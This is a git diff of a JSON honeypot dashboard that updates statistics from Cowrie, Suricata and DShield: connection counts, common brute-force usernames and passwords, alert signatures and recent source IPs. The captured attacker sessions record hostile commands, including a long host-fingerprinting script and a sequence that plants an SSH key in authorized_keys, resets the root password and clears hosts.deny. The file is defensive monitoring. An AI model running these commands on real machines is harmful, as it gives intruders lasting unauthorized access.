@@ -1,23 +1,23 @@
 {
-  "last_updated": "2026-07-30T05:00:01.304795+00:00",
-  "last_updated_local": "2026-07-29 22:00:01 PDT",
+  "last_updated": "2026-07-30T05:30:01.914011+00:00",
+  "last_updated_local": "2026-07-29 22:30:01 PDT",
   "cowrie": {
-    "total_connections": 4124,
-    "total_login_attempts": 3760,
-    "successful_logins": 39,
-    "unique_ips": 130,
+    "total_connections": 4189,
+    "total_login_attempts": 3813,
+    "successful_logins": 40,
+    "unique_ips": 133,
     "top_usernames": [
       [
         "root",
-        1289
+        1311
       ],
       [
         "admin",
-        194
+        198
       ],
       [
         "ubuntu",
-        71
+        72
       ],
       [
         "user",
@@ -37,37 +37,37 @@
       ],
       [
         "administrator",
+        23
+      ],
+      [
+        "ftpuser",
         22
       ],
       [
         "postgres",
-        21
-      ],
-      [
-        "user1",
         21
       ]
     ],
     "top_passwords": [
       [
         "123456",
-        214
+        218
       ],
       [
         "123",
-        106
+        108
       ],
       [
         "password",
-        85
+        86
       ],
       [
         "1234",
-        76
+        77
       ],
       [
         "admin",
-        68
+        69
       ],
       [
         "12345678",
@@ -75,11 +75,11 @@
       ],
       [
         "12345",
-        52
+        54
       ],
       [
         "1",
-        51
+        52
       ],
       [
         "root",
@@ -525,156 +525,174 @@
           "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '\"' ) || echo \"\"); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox uname -m 2>/dev/null || ( [ -f /proc/cpuinfo ] && grep -q \"lm\" /proc/cpuinfo && echo x86_64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 8\" /proc/cpuinfo && echo aarch64 ) || ( [ -f /proc/cpuinfo ] && grep -q \"CPU architecture: 7\" /proc/cpuinfo && echo armv7l ) || echo \"\"); uptime=$(cat /proc/uptime 2>/dev/null || busybox cat /proc/uptime 2>/dev/null); cpus=$(nproc 2>/dev/null || /usr/bin/nproc 2>/dev/null || busybox nproc 2>/dev/null || grep -c \"^processor\" /proc/cpuinfo 2>/dev/null); cpu_model=$( { lscpu 2>/dev/null | awk -F: '/Model name/ {print $2}'; grep -m1 -E \"^model name\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; grep -m1 -E \"^Hardware\" /proc/cpuinfo 2>/dev/null | cut -d: -f2-; cat /proc/device-tree/model 2>/dev/null; } | sed '/^$/d; /unknown/d; s/^[[:space:]]*//; s/[[:space:]]*$//; s/ AArch64 Processor$//; s/ Processor$//; s/ CPU$//' | head -1 ); gpu_info=$( (lspci 2>/dev/null | grep -i vga; lspci 2>/dev/null | grep -i nvidia; busybox lspci 2>/dev/null | grep -i vga; busybox lspci 2>/dev/null | grep -i nvidia) 2>/dev/null ); last_output=$(last 2>/dev/null); filter_output=$( ( export LANG=C LC_ALL=C; echo '===SHELL_BEHAVIOR==='; printf 'path_err='; ( ./xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'cmd_err='; ( xxxxxx 2>&1 || true ) | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; printf 'execute_err='; out=$(bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(/usr/bin/bash -c 'printf \"#!/bin/bash\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); case \"$out\" in *xxxxxx*) ;; *) out=$(busybox sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1 || sh -c 'printf \"#!/bin/sh\\necho \\\"xxxxxx\\\"\\n\" > filter && chmod +x filter && ./filter && rm -rf filter' 2>&1); esac; esac; esac; printf '%s' \"$out\" | ( head -c 250 2>/dev/null || busybox head -c 250 2>/dev/null || dd bs=250 count=1 2>/dev/null ) | ( tr -d '\\n' 2>/dev/null || busybox tr -d '\\n' 2>/dev/null || cat ); printf '\\n'; echo '===DONE===' ) 2>&1 ); echo \"UNAME:$uname\"; echo \"ARCH:$arch\"; echo \"UPTIME:$uptime\"; echo \"CPUS:$cpus\"; echo \"CPU_MODEL:$cpu_model\"; echo \"GPU:$gpu_info\"; echo \"LAST:$last_output\"; echo \"FILTER:$filter_output\"",
           "uname -s -v -n -m 2 > /dev/null || /bin/uname -s -v -n -m 2 > /dev/null || /usr/bin/uname -s -v -n -m 2 > /dev/null || busybox uname -s -v -n -m 2 > /dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d  -f1 "
         ]
+      },
+      {
+        "ip": "91.134.138.62",
+        "username": "root",
+        "password": "Admin12345678$",
+        "time": "22:01:15",
+        "commands": [
+          "cd ~; chattr -ia .ssh; lockr -ia .ssh",
+          "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+          "cat /proc/cpuinfo | grep name | wc -l",
+          "echo \"root:3nLysqPn5Ieq\"|chpasswd|bash",
+          "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;",
+          "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+          "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+          "ls -lh $(which ls)",
+          "which ls",
+          "crontab -l"
+        ]
       }
     ],
     "recent_attempts": [
       {
-        "time": "21:48:57",
+        "time": "22:17:55",
+        "ip": "185.100.215.213",
+        "username": "root",
+        "password": "QAZwsx123.",
+        "success": false
+      },
+      {
+        "time": "22:19:04",
+        "ip": "103.229.125.106",
+        "username": "root",
+        "password": "!@#$QWER",
+        "success": false
+      },
+      {
+        "time": "22:19:38",
+        "ip": "130.211.87.185",
+        "username": "admin",
+        "password": "admin",
+        "success": false
+      },
+      {
+        "time": "22:19:53",
+        "ip": "78.44.192.210",
+        "username": "liu",
+        "password": "123",
+        "success": false
+      },
+      {
+        "time": "22:19:55",
         "ip": "91.134.138.62",
+        "username": "root",
+        "password": "@q1w2e3r4",
+        "success": false
+      },
+      {
+        "time": "22:21:59",
+        "ip": "103.229.125.106",
+        "username": "harold",
+        "password": "harold",
+        "success": false
+      },
+      {
+        "time": "22:22:03",
+        "ip": "91.134.138.62",
+        "username": "ubuntu",
+        "password": "P@55word",
+        "success": false
+      },
+      {
+        "time": "22:22:10",
+        "ip": "78.44.192.210",
+        "username": "root",
+        "password": "test123456",
+        "success": false
+      },
+      {
+        "time": "22:22:36",
+        "ip": "185.100.215.213",
+        "username": "root",
+        "password": "qwe123@@@",
+        "success": false
+      },
+      {
+        "time": "22:24:07",
+        "ip": "91.134.138.62",
+        "username": "root",
+        "password": "wocaonima",
+        "success": false
+      },
+      {
+        "time": "22:24:11",
+        "ip": "103.229.125.106",
+        "username": "matheus",
+        "password": "123456",
+        "success": false
+      },
+      {
+        "time": "22:24:50",
+        "ip": "78.44.192.210",
         "username": "root",
         "password": "bgj948888",
         "success": false
       },
       {
-        "time": "21:49:41",
-        "ip": "78.44.192.210",
-        "username": "root",
-        "password": "ubuntuserver",
+        "time": "22:25:33",
+        "ip": "185.100.215.213",
+        "username": "namrata",
+        "password": "namrata",
         "success": false
       },
       {
-        "time": "21:49:52",
+        "time": "22:26:23",
+        "ip": "91.134.138.62",
+        "username": "root",
+        "password": "Qwe1234!",
+        "success": false
+      },
+      {
+        "time": "22:26:26",
+        "ip": "193.24.211.76",
+        "username": "admin",
+        "password": "admin123@#",
+        "success": false
+      },
+      {
+        "time": "22:26:40",
+        "ip": "103.229.125.106",
+        "username": "root",
+        "password": "123QWE!@#",
+        "success": false
+      },
+      {
+        "time": "22:27:37",
+        "ip": "78.44.192.210",
+        "username": "root",
+        "password": "Qwe1234!",
+        "success": false
+      },
+      {
+        "time": "22:28:09",
         "ip": "185.100.215.213",
         "username": "root",
-        "password": "teste@123",
+        "password": "test123!@#",
         "success": false
       },
       {
-        "time": "21:51:02",
+        "time": "22:28:29",
         "ip": "91.134.138.62",
         "username": "root",
-        "password": "Qazwsx2026",
+        "password": "loollzz321",
         "success": false
       },
       {
-        "time": "21:51:05",
+        "time": "22:29:03",
         "ip": "103.229.125.106",
-        "username": "root",
-        "password": "123456.",
-        "success": false
-      },
-      {
-        "time": "21:52:20",
-        "ip": "78.44.192.210",
-        "username": "root",
-        "password": "exit",
-        "success": false
-      },
-      {
-        "time": "21:53:07",
-        "ip": "91.134.138.62",
-        "username": "ubuntu",
-        "password": "ubuntu01!",
-        "success": false
-      },
-      {
-        "time": "21:53:37",
-        "ip": "103.229.125.106",
-        "username": "root",
-        "password": "Server2024",
-        "success": false
-      },
-      {
-        "time": "21:54:10",
-        "ip": "185.100.215.213",
-        "username": "games",
-        "password": "passwd123467",
-        "success": false
-      },
-      {
-        "time": "21:54:37",
-        "ip": "78.44.192.210",
-        "username": "test",
-        "password": "112233",
-        "success": false
-      },
-      {
-        "time": "21:55:13",
-        "ip": "91.134.138.62",
-        "username": "runner",
-        "password": "1",
-        "success": false
-      },
-      {
-        "time": "21:56:08",
-        "ip": "103.229.125.106",
-        "username": "autumn",
+        "username": "luo",
         "password": "123456",
-        "success": false
-      },
-      {
-        "time": "21:56:49",
-        "ip": "78.44.192.210",
-        "username": "root",
-        "password": "123456xX",
-        "success": false
-      },
-      {
-        "time": "21:56:49",
-        "ip": "185.100.215.213",
-        "username": "michal",
-        "password": "michal",
-        "success": false
-      },
-      {
-        "time": "21:57:13",
-        "ip": "91.134.138.62",
-        "username": "devserver",
-        "password": "devserver",
-        "success": false
-      },
-      {
-        "time": "21:58:03",
-        "ip": "45.154.244.149",
-        "username": "www-data",
-        "password": "www-data",
-        "success": false
-      },
-      {
-        "time": "21:58:33",
-        "ip": "103.229.125.106",
-        "username": "zy",
-        "password": "123456",
-        "success": false
-      },
-      {
-        "time": "21:58:55",
-        "ip": "78.44.192.210",
-        "username": "frontend",
-        "password": "1",
-        "success": false
-      },
-      {
-        "time": "21:59:11",
-        "ip": "91.134.138.62",
-        "username": "root",
-        "password": "sirius",
-        "success": false
-      },
-      {
-        "time": "21:59:25",
-        "ip": "185.100.215.213",
-        "username": "zhangsan",
-        "password": "zhangsan",
         "success": false
       }
     ]
   },
   "suricata": {
-    "total_alerts": 748,
+    "total_alerts": 752,
     "alerts_by_severity": {
-      "2": 309,
-      "3": 439
+      "2": 311,
+      "3": 441
     },
     "top_signatures": [
       [
@@ -683,19 +701,19 @@
       ],
       [
         "ET SCAN Potential SSH Scan",
-        121
+        122
       ],
       [
         "ET DROP Dshield Block Listed Source group 1",
-        62
-      ],
-      [
-        "ET CINS Active Threat Intelligence Poor Reputation IP group 187",
-        19
+        63
       ],
       [
         "ET DROP Spamhaus DROP Listed Traffic Inbound group 7",
         19
+      ],
+      [
+        "ET CINS Active Threat Intelligence Poor Reputation IP group 187",
+        18
       ],
       [
         "ET DROP Spamhaus DROP Listed Traffic Inbound group 10",
@@ -706,11 +724,11 @@
         7
       ],
       [
-        "ET DROP Spamhaus DROP Listed Traffic Inbound group 43",
-        4
+        "ET DROP Spamhaus DROP Listed Traffic Inbound group 28",
+        5
       ],
       [
-        "ET DROP Spamhaus DROP Listed Traffic Inbound group 28",
+        "ET DROP Spamhaus DROP Listed Traffic Inbound group 43",
         4
       ],
       [
@@ -748,12 +766,12 @@
         42
       ],
       [
-        "139.19.117.197",
+        "92.118.39.71",
         41
       ],
       [
-        "92.118.39.71",
-        41
+        "139.19.117.197",
+        39
       ],
       [
         "195.178.110.232",
@@ -761,55 +779,6 @@
       ]
     ],
     "recent_alerts": [
-      {
-        "time": "21:20:23",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "92.118.39.71",
-        "dest_port": 22
-      },
-      {
-        "time": "21:21:59",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "2.57.122.209",
-        "dest_port": 22
-      },
-      {
-        "time": "21:22:28",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "92.118.39.71",
-        "dest_port": 22
-      },
-      {
-        "time": "21:24:23",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "2.57.122.209",
-        "dest_port": 22
-      },
-      {
-        "time": "21:24:33",
-        "severity": 3,
-        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
-        "src_ip": "92.118.39.71",
-        "dest_port": 22
-      },
-      {
-        "time": "21:25:08",
-        "severity": 2,
-        "signature": "ET CINS Active Threat Intelligence Poor Reputation IP group 218",
-        "src_ip": "165.154.163.138",
-        "dest_port": 8443
-      },
-      {
-        "time": "21:26:10",
-        "severity": 2,
-        "signature": "ET DROP Spamhaus DROP Listed Traffic Inbound group 7",
-        "src_ip": "45.153.34.181",
-        "dest_port": 22
-      },
       {
         "time": "21:26:37",
         "severity": 3,
@@ -900,12 +869,61 @@
         "signature": "SURICATA STREAM Packet with invalid timestamp",
         "src_ip": "103.229.125.106",
         "dest_port": 22
+      },
+      {
+        "time": "22:07:33",
+        "severity": 2,
+        "signature": "ET DROP Spamhaus DROP Listed Traffic Inbound group 28",
+        "src_ip": "141.98.11.11",
+        "dest_port": 8000
+      },
+      {
+        "time": "22:19:36",
+        "severity": 3,
+        "signature": "ET INFO SSH-2.0-Go version string Observed in Network Traffic",
+        "src_ip": "130.211.87.185",
+        "dest_port": 22
+      },
+      {
+        "time": "22:20:00",
+        "severity": 2,
+        "signature": "ET SCAN Potential SSH Scan",
+        "src_ip": "104.199.24.235",
+        "dest_port": 22
+      },
+      {
+        "time": "22:21:13",
+        "severity": 3,
+        "signature": "SURICATA STREAM 3way handshake SYN resend different seq on SYN recv",
+        "src_ip": "66.175.214.112",
+        "dest_port": 8000
+      },
+      {
+        "time": "22:21:28",
+        "severity": 3,
+        "signature": "SURICATA STREAM ESTABLISHED SYN resend with different seq",
+        "src_ip": "66.175.214.112",
+        "dest_port": 8000
+      },
+      {
+        "time": "22:25:16",
+        "severity": 2,
+        "signature": "ET DROP Dshield Block Listed Source group 1",
+        "src_ip": "45.198.224.26",
+        "dest_port": 8000
+      },
+      {
+        "time": "22:25:57",
+        "severity": 2,
+        "signature": "ET DROP Spamhaus DROP Listed Traffic Inbound group 10",
+        "src_ip": "77.90.185.10",
+        "dest_port": 8443
       }
     ]
   },
   "dshield": {
-    "total_connections": 4077,
-    "unique_ips": 328,
+    "total_connections": 4154,
+    "unique_ips": 336,
     "top_src_ips": [
       [
         "91.92.42.195",
@@ -951,24 +969,20 @@
     "top_dest_ports": [
       [
         "22",
-        3832
+        3899
       ],
       [
         "8443",
-        147
+        153
       ],
       [
         "8000",
-        98
+        102
       ]
     ],
     "recent_connections": [
       {
-        "src_ip": "91.134.138.62",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "165.154.36.218",
+        "src_ip": "66.175.214.112",
         "dest_port": "8443"
       },
       {
@@ -976,31 +990,7 @@
         "dest_port": "22"
       },
       {
-        "src_ip": "78.44.192.210",
-        "dest_port": "22"
-      },
-      {
         "src_ip": "91.134.138.62",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "103.229.125.106",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "185.100.215.213",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "78.44.192.210",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "91.134.138.62",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "103.229.125.106",
         "dest_port": "22"
       },
       {
@@ -1012,18 +1002,14 @@
         "dest_port": "22"
       },
       {
-        "src_ip": "91.134.138.62",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "45.154.244.149",
-        "dest_port": "22"
-      },
-      {
-        "src_ip": "159.223.217.240",
+        "src_ip": "93.174.93.12",
         "dest_port": "8000"
       },
       {
+        "src_ip": "91.134.138.62",
+        "dest_port": "22"
+      },
+      {
         "src_ip": "103.229.125.106",
         "dest_port": "22"
       },
@@ -1032,7 +1018,31 @@
         "dest_port": "22"
       },
       {
+        "src_ip": "45.198.224.26",
+        "dest_port": "8000"
+      },
+      {
+        "src_ip": "185.100.215.213",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "77.90.185.10",
+        "dest_port": "8443"
+      },
+      {
         "src_ip": "91.134.138.62",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "193.24.211.76",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "103.229.125.106",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "78.44.192.210",
         "dest_port": "22"
       },
       {
@@ -1040,8 +1050,16 @@
         "dest_port": "22"
       },
       {
-        "src_ip": "160.119.76.64",
-        "dest_port": "8443"
+        "src_ip": "91.134.138.62",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "103.229.125.106",
+        "dest_port": "22"
+      },
+      {
+        "src_ip": "78.44.192.210",
+        "dest_port": "22"
       }
     ]
   }
